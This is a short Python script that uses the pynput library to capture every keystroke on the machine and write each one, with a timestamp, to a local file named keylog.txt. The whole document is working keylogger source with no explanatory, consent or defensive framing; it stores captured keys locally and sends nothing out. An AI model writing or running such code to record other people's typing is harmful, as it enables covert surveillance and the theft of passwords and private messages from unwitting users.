from pynput.keyboard import Listener
import logging

# Specify the log file
log_file = "keylog.txt"

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Function to log keys
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Set up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
